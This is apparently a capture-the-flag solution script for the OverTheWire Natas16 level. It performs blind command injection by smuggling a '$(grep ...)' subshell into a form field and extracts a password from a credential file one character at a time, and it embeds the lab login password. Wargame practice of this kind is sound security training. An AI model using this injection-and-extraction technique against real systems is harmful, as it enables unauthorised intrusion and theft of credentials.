# Natas16 - blind grep injection

import time

import requests
from string import ascii_lowercase
from string import ascii_uppercase


# special_characters = "~!@#$%^&*()_+`-=,./;'[]\\<>?:\"{}|"
numbers = "0123456789"

# most likely like a MD5 hash 32 characters
characters_set = ascii_lowercase + ascii_uppercase + numbers


def format_timer(seconds):
    sign_string = '-' if seconds < 0 else ''
    seconds = abs(int(seconds))
    days, seconds = divmod(seconds, 86400)
    hours, seconds = divmod(seconds, 3600)
    minutes, seconds = divmod(seconds, 60)
    if days > 0:
        return '%s %dd %dh %dm %ds' % (sign_string, days, hours, minutes, seconds)
    elif hours > 0:
        return '%s %dh %dm %ds' % (sign_string, hours, minutes, seconds)
    elif minutes > 0:
        return '%s %dm %ds' % (sign_string, minutes, seconds)
    else:
        return '%s %ds' % (sign_string, seconds)

def find_password(password_character_set):
    part_password = ""

    password_search_action_name = "*  Password Search.  *"
    print("\n{1}\n{0}\n{1}\n\n[ETA 5m] Testing characters one by one.\n".format(
        password_search_action_name,
        "*" * len(password_search_action_name)
    ))

    part_password = ""
    for i in range(32):
        for character in password_character_set:  # Change this to test multi queries at a time to speed this up.
            user_data = {'needle': '$(grep ^{0}{1} /etc/natas_webpass/natas17)exists'.format(part_password, character)}
            request = requests.post('http://natas16.natas.labs.overthewire.org/index.php',
                                    auth=('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'), data=user_data)

            if 'exists' not in request.text:
                part_password = part_password + character
                print("Confirmed password characters: {0}".format(part_password))
                break
            if character == "9":
                print("Not found.")
    return part_password

t0 = time.time()  # Start timing
password = find_password(characters_set)
if password:
    t1 = time.time()  # End timer the search for the password is complete.
    print(
        "[Password search - completed in:{0}] Success, the password is: {1}\n".format(format_timer(t1 - t0), password))
